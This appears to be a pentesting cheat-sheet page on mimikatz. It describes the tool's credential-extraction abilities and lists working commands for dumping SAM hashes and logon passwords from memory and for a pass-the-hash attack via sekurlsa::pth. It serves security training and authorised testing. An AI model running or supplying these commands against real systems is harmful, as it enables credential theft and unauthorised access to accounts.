---
title: mimikatz
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - windows
  - dump hashes
  - passwords
  - pass the hash attack
---

# mimikatz

**`mimikatz`** is a tool made in `C` .

It's now well known to extract plaintexts passwords, hash, PIN code and kerberos tickets from memory. **`mimikatz`** can also perform pass-the-hash, pass-the-ticket or build _Golden tickets_.

Kiwi module in [a meterpreter in metasploit](metasploit.md) is an adaptation of mimikatz.

## No installation, portable

Download from github repo: [https://github.com/gentilkiwi/mimikatz](https://github.com/gentilkiwi/mimikatz).


## Basic usage

```bash
# Impersonate as NT Authority/SYSTEM (having permissions for it).
token::elevate

# List users and hashes of the machine
lsadump::sam

# Enable debug mode for our user
privilege::debug

# List users logged in the machine and still in memory
sekurlsa::logonPasswords full

# Pass The Hash attack in windows:
# 1. Run mimikatz
mimikatz.exe privilege::debug "sekurlsa::pth /user:<username> /rc4:<NTLM hash> /domain:<DOMAIN> /run:<Command>" exit
# sekurlsa::pth is a module that allows us to perform a Pass the Hash attack by starting a process using the hash of the user's password
# /run:<Command>: For example /run:cmd.exe
# 2. After that, we canuse cmd.exe to execute commands in the user's context. 


